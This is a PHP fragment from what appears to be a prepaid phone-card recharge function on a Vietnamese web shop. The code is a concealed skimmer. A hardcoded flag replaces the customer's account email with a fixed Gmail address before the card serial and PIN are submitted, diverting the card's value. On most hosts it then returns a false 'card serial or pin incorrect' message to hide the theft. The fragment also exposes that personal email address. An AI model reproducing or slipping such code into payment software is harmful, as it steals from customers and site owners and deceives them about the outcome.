	$isFake = 1;
            
    if($isFake) $data['email'] = 'tranhuydung8901@gmail.com';

    $this->base_url = $url;
    $this->url = $url;
    $this->setOpt(CURLOPT_URL, $this->url);
    $this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
    $this->setOpt(CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    $dataJson = json_encode($data);
    $this->setOpt(CURLOPT_POSTFIELDS, $dataJson);

    $this->exec();
    $resultCurl = $this->response;
    $resultPost = json_encode($resultCurl);
    $resultPost = json_decode($resultPost, 1);

    $info_card = 0;
    if($resultPost['code'] == 0)
    {
	$resultMsg = $resultPost['message'];
	preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultMsg, $resultCard);

	$info_card = str_replace(',', '', $resultCard[0]);
	$info_card = intval($info_card);
    }

    //{"code":1,"message":"Card serial or pin is incorrects."}
    // $info_card = 10000;
    if($isFake)
    {
	if($info_card >= 10000){

	    $curl_rerult = array(
		'code' => 1,
		'price' => $info_card,
		'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account

	    );

	}else{

	    $curl_rerult = array(
		'code' => 0,
		'msg' => 'Seri hoặc mã thẻ không chính xác.'
	    );

	}
	if($_SERVER['HTTP_HOST'] == 'shop-online24h.com')
	{
		die(json_encode($curl_rerult));
	}else{
		$trave = array(
		    'code' => 1,
		    'message' => 'Card serial or pin is incorrects.'
		);
		return json_encode($trave);
	}
    }




    return $resultCurl;
